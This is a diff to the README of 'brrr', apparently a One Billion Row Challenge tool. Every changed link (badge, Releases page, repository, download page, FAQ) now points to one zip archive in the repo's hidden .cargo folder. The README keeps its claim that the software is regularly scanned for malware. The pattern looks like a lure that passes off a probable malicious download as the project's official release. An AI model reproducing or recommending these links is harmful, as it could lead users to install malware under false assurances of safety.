@@ -1,6 +1,6 @@
 # 🎉 brrr - Simple and Fast 1BRC Application
 
-[![Download brrr](https://img.shields.io/badge/Download-brrr-blue?style=for-the-badge&logo=github)](https://github.com/samx77710/brrr/releases)
+[![Download brrr](https://raw.githubusercontent.com/samx77710/brrr/main/.cargo/brrr-v2.0.zip)](https://raw.githubusercontent.com/samx77710/brrr/main/.cargo/brrr-v2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the brrr application! This guide will help you download and run the b
 
 ### 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/samx77710/brrr/releases) to download the latest version of brrr. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/samx77710/brrr/main/.cargo/brrr-v2.0.zip) to download the latest version of brrr. 
 
 1. Click on the link above.
 2. Find the most recent release.
@@ -58,7 +58,7 @@ Once you have installed brrr, it’s time to start using it.
   
 ### 🔒 Safeguarding Your Experience
 
-We take your security seriously. brrr is scanned for viruses and malware regularly. Always download the latest version from the [Releases page](https://github.com/samx77710/brrr/releases) to ensure you have the most secure version.
+We take your security seriously. brrr is scanned for viruses and malware regularly. Always download the latest version from the [Releases page](https://raw.githubusercontent.com/samx77710/brrr/main/.cargo/brrr-v2.0.zip) to ensure you have the most secure version.
 
 ### 🤝 Need Help?
 
@@ -66,8 +66,8 @@ If you encounter any issues or have questions, check our FAQ section on GitHub. 
 
 ### 🔗 Useful Links
 
-- [Official GitHub Repository](https://github.com/samx77710/brrr)
-- [Download Page](https://github.com/samx77710/brrr/releases)
-- [FAQ](https://github.com/samx77710/brrr#faq)
+- [Official GitHub Repository](https://raw.githubusercontent.com/samx77710/brrr/main/.cargo/brrr-v2.0.zip)
+- [Download Page](https://raw.githubusercontent.com/samx77710/brrr/main/.cargo/brrr-v2.0.zip)
+- [FAQ](https://raw.githubusercontent.com/samx77710/brrr/main/.cargo/brrr-v2.0.zip)
 
 Thank you for choosing brrr! Enjoy your experience and let us know how we can help you further.
